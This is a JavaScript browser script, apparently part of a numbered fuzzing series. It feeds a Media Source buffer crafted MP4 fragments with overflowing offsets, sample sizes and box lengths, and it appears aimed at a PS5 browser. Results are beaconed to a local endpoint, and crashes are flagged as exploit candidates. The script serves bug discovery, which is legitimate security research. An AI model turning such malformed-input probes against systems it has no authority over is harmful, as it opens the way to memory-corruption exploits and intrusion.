/* p65-mse-esc — MSE integer overflow escalation
 * Targets: data_offset wraps, sample_size overflows, count*size multiplication,
 * self-referential offsets, HEVC parser path, overlapping time ranges.
 * Beacon prefix: V65E-
 */
(function(){
"use strict";
var RUN_ID = "v65e" + Math.random().toString(36).slice(2,12);
var PREFIX = "V65E-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,400)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press65-MSE integer overflow escalation");

/* ---- box builders (from p61) ---- */
function u32(v) { return [v>>>24&0xFF, v>>>16&0xFF, v>>>8&0xFF, v&0xFF]; }
function u16(v) { return [v>>>8&0xFF, v&0xFF]; }
function i32(v) { return u32(v|0); }
function box(type, payload) {
  var p = payload || [];
  var sz = 8 + p.length;
  return [].concat(u32(sz), [type.charCodeAt(0),type.charCodeAt(1),type.charCodeAt(2),type.charCodeAt(3)], p);
}
function fullbox(type, version, flags, payload) {
  return box(type, [version&0xFF].concat(u32(flags).slice(1)).concat(payload||[]));
}

/* ---- H.264 Baseline NALUs (real, from p61) ---- */
var SPS = [0x00,0x00,0x00,0x08, 0x67,0x42,0xC0,0x1E, 0xD9,0x00,0xA0,0x47];
var PPS = [0x00,0x00,0x00,0x04, 0x68,0xCE,0x38,0x80];
var IDR = [0x00,0x00,0x00,0x09, 0x65,0x88,0x80,0x40, 0x00,0x00,0x03,0x00,0x00];
var NALU_DATA = SPS.concat(PPS).concat(IDR);
var NALU_LEN = NALU_DATA.length;

/* ---- init segment: p61's proven 609B binary (avc1.42C01E, vt=1 on PS5 14.20) ---- */
var P61_INIT="AAAAHGZ0eXBpc29tAAACAGlzb21pc28yYXZjMQAAAkVtb292AAAAbG12aGQAAAAAAAAAAAAAAAAAAAPoAAAAAAABAAABAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAB0XRyYWsAAABgdGtoZAAAAAcAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAABAAAAAAUAAAADwAAAAAAFpbWRpYQAAACBtZGhkAAAAAAAAAAAAAAAAAAFfkAAAAABVxAAAAAAALmhkbHIAAAAAAAAAAHZpZGUAAAAAAAAAAAAAAAAAVmlkZW9IYW5kbGVyAAAAARNtaW5mAAAAFHZtaGQAAAABAAAAAAAAAAAAAAAkZGluZgAAABxkcmVmAAAAAAAAAAEAAAAMdXJsIAAAAAEAAADTc3RibAAAAIdzdHNkAAAAAAAAAAEAAAB3YXZjMQAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAFAAPAASAAAAEgAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABj//wAAACFhdmNDAULAHv8AAQAIZ0LAHtoFB8QAAQAEaM44gAAAABBzdHRzAAAAAAAAAAAAAAAQc3RzYwAAAAAAAAAAAAAAEHN0Y28AAAAAAAAAAAAAABRzdHN6AAAAAAAAAAAAAAAA";
function makeInit() {
  var raw = atob(P61_INIT);
  var ia = new Uint8Array(raw.length);
  for (var i = 0; i < raw.length; i++) ia[i] = raw.charCodeAt(i);
  return ia;
}

/* ---- media segment builder (matches p61 format: tfhd+tfdt+trun, flags 0x000301) ---- */
function makeSeg(seq, opts) {
  var sampleCount = opts.sampleCount || 1;
  var sampleSize  = opts.sampleSize  || NALU_LEN;
  var duration    = opts.duration || 3000;
  var baseDecodeTime = opts.baseTime !== undefined ? opts.baseTime : ((seq - 1) * duration);
  var noTrun      = opts.noTrun || false;
  var extraTrun   = opts.extraTrun || false;
  var mdatLen     = opts.mdatLen;
  var customOffset = opts.dataOffset;

  /* tfhd: 16B, tfdt(v1): 20B, trun: 20 + sampleCount*8 */
  /* mfhd: 16B, traf: 8 + contents, moof: 8 + contents */
  var mfhd = fullbox("mfhd", 0, 0, u32(seq));
  var tfhd = fullbox("tfhd", 0, 0x020000, u32(1));
  var tfdt = fullbox("tfdt", 1, 0, [0,0,0,0].concat(u32(baseDecodeTime)));

  var trunPayload = [];
  if (!noTrun) {
    var nSamples = Math.min(sampleCount, 4);
    var trunSize = 20 + nSamples * 8;
    var trafSize = 8 + 16 + 20 + trunSize;
    var moofSize = 8 + 16 + trafSize;
    if (extraTrun) {
      var extraTrunSize = 20 + 8;
      trafSize += extraTrunSize;
      moofSize = 8 + 16 + trafSize;
    }
    var dataOffset = customOffset !== undefined ? customOffset : (moofSize + 8);

    var trunData = u32(sampleCount);
    trunData = trunData.concat(i32(dataOffset));
    for (var i = 0; i < nSamples; i++) {
      trunData = trunData.concat(u32(duration), u32(sampleSize));
    }
    trunPayload = fullbox("trun", 0, 0x000301, trunData);
  }

  var extraTrunPayload = [];
  if (extraTrun) {
    extraTrunPayload = fullbox("trun", 0, 0x000301,
      u32(1).concat(i32(extraTrun.offset || 0), u32(duration), u32(extraTrun.size || NALU_LEN)));
  }

  var trafContent = tfhd.concat(tfdt);
  if (trunPayload.length) trafContent = trafContent.concat(trunPayload);
  if (extraTrunPayload.length) trafContent = trafContent.concat(extraTrunPayload);
  var traf = box("traf", trafContent);

  var moof = box("moof", mfhd.concat(traf));

  var mdatBody;
  if (mdatLen !== undefined) {
    mdatBody = new Array(mdatLen);
    for (var j = 0; j < mdatLen; j++) mdatBody[j] = NALU_DATA[j % NALU_DATA.length] || 0;
  } else {
    mdatBody = NALU_DATA.slice();
  }
  var mdat = box("mdat", mdatBody);

  return { data: new Uint8Array(moof.concat(mdat)), moofLen: moof.length };
}

/* ---- Escalation segments ---- */
var SEGS = [
  { name:"S0-clean",        seq:1,  opts:{} },
  // Integer overflow: data_offset near INT32_MIN
  { name:"S1-off-intmin",   seq:2,  opts:{ dataOffset: -2147483647 } },
  // data_offset = exactly -moofLen (points to start of moof = self-referential)
  { name:"S2-off-self",     seq:3,  opts:{ dataOffset: "SELF" } },
  // sample_size = 0xFFFFFFFF (uint32 max, wraps on add)
  { name:"S3-sz-u32max",    seq:4,  opts:{ sampleSize: 0xFFFFFFFF } },
  // sample_size = 0x80000000 (sign bit, negative when cast to int32)
  { name:"S4-sz-signbit",   seq:5,  opts:{ sampleSize: 0x80000000 } },
  // count * size overflow: 256 samples * 0x01000001 = wraps to 256
  { name:"S5-mul-wrap",     seq:6,  opts:{ sampleCount: 256, sampleSize: 0x01000001 } },
  // count=0 (edge: empty trun)
  { name:"S6-cnt-zero",     seq:7,  opts:{ sampleCount: 0, sampleSize: 0 } },
  // huge count, small size: 0x10000 samples * 1 byte = 64KB virtual, 29B real
  { name:"S7-cnt-huge",     seq:8,  opts:{ sampleCount: 0x10000, sampleSize: 1 } },
  // data_offset = +0x7FFFFFFF (points way past mdat)
  { name:"S8-off-huge-pos", seq:9,  opts:{ dataOffset: 0x7FFFFFFF } },
  // overlapping trun: 2 truns both claim offset 0, different sizes
  { name:"S9-trun-clash",   seq:10, opts:{ extraTrun: { offset: 0, size: 0x7FFFFFFF } } },
  // mdat=0 but trun says 4 samples of NALU_LEN each
  { name:"S10-phantom",     seq:11, opts:{ sampleCount: 4, mdatLen: 0 } },
  // mdat huge claim: mdat box says 1MB but only 29 bytes follow
  { name:"S11-mdat-lie",    seq:12, opts:{ mdatLen: 29 }, mdatBoxOverride: 0x100000 },
];

/* ---- MSE setup ---- */
var ms, sb, initData, segIdx = 0;
var results = {};
var totalErrors = 0;

function logResult(name, r) {
  results[name] = r;
  B("R" + name, r);
}

function feedNext() {
  if (segIdx >= SEGS.length) {
    finish();
    return;
  }
  var s = SEGS[segIdx];
  var opts = {};
  for (var k in s.opts) opts[k] = s.opts[k];

  // Build segment
  var seg;
  if (opts.dataOffset === "SELF") {
    // Two-pass: build first to get moofLen, then rebuild with -moofLen
    var tmp = makeSeg(s.seq, {});
    opts.dataOffset = -tmp.moofLen;
    seg = makeSeg(s.seq, opts);
  } else {
    seg = makeSeg(s.seq, opts);
  }

  // Override mdat box length if needed
  var data = seg.data;
  if (s.mdatBoxOverride) {
    var mdatStart = seg.moofLen;
    var arr = new Uint8Array(data);
    var ov = s.mdatBoxOverride + 8;
    arr[mdatStart]   = (ov>>>24)&0xFF;
    arr[mdatStart+1] = (ov>>>16)&0xFF;
    arr[mdatStart+2] = (ov>>>8)&0xFF;
    arr[mdatStart+3] = ov&0xFF;
    data = arr;
  }

  B("E" + s.name, "sent " + data.byteLength + "B");

  var errBefore = totalErrors;
  try {
    sb.appendBuffer(data);
  } catch(e) {
    logResult(s.name, "THROW:" + (e.name||"") + " " + (e.message||"").slice(0,80));
    segIdx++;
    setTimeout(feedNext, 50);
    return;
  }

  var t0 = performance.now();
  sb.addEventListener("updateend", function onUE() {
    sb.removeEventListener("updateend", onUE);
    var dt = (performance.now() - t0).toFixed(1);
    var br = "EMPTY";
    try {
      if (sb.buffered.length > 0) br = "[" + sb.buffered.start(0).toFixed(3) + "-" + sb.buffered.end(sb.buffered.length-1).toFixed(3) + "]";
    } catch(e) { br = "ERR"; }
    var newErr = totalErrors - errBefore;
    logResult(s.name, "d=" + dt + "ms buf=" + br + " e=" + newErr);
    segIdx++;
    setTimeout(feedNext, 30);
  }, {once:true});

  sb.addEventListener("error", function onErr() {
    sb.removeEventListener("error", onErr);
    logResult(s.name, "SB-ERROR");
    segIdx++;
    setTimeout(feedNext, 50);
  }, {once:true});
}

function finish() {
  var summary = [];
  for (var i = 0; i < SEGS.length; i++) {
    var n = SEGS[i].name;
    var r = results[n] || "MISSING";
    var mark = r.indexOf("THROW") >= 0 || r.indexOf("ERROR") >= 0 ? "!" : "+";
    summary.push(n.split("-").slice(0,2).join("-") + ":" + mark);
  }
  B("Sum", summary.join(" "));

  // Check for any crashes (missing results = beacon lost = crash)
  var crashes = [];
  for (var j = 0; j < SEGS.length; j++) {
    if (!results[SEGS[j].name]) crashes.push(SEGS[j].name);
  }
  B("VERDICT", crashes.length ? "CRASH-CANDIDATES:" + crashes.join(",") : "ALL-SURVIVED e=" + totalErrors);
  B("END", "press65-done tests=" + SEGS.length);
}

function startProbe() {
  ms = new MediaSource();
  var v = document.createElement("video");
  v.muted = true;
  v.src = URL.createObjectURL(ms);

  ms.addEventListener("sourceopen", function() {
    try {
      sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42C01E"');
    } catch(e) {
      B("FAIL", "addSourceBuffer: " + e.message);
      return;
    }
    sb.addEventListener("error", function() { totalErrors++; });

    initData = makeInit();
    B("EINIT", "sent " + initData.byteLength + "B");
    sb.appendBuffer(initData);
    sb.addEventListener("updateend", function onInit() {
      sb.removeEventListener("updateend", onInit);
      var dt = "?";
      var br = "EMPTY";
      try {
        if (sb.buffered.length > 0) br = "[" + sb.buffered.start(0).toFixed(3) + "-" + sb.buffered.end(sb.buffered.length-1).toFixed(3) + "]";
      } catch(e){}
      B("RINIT", "buf=" + br + " e=" + totalErrors);
      feedNext();
    }, {once:true});
  });
}

try { startProbe(); } catch(e) { B("FATAL", String(e).slice(0,200)); }

/* heartbeat */
var hbI = setInterval(function(){ B("HB","hb"); }, 2000);
setTimeout(function(){ clearInterval(hbI); B("Z2","late-z"); }, 16000);
})();
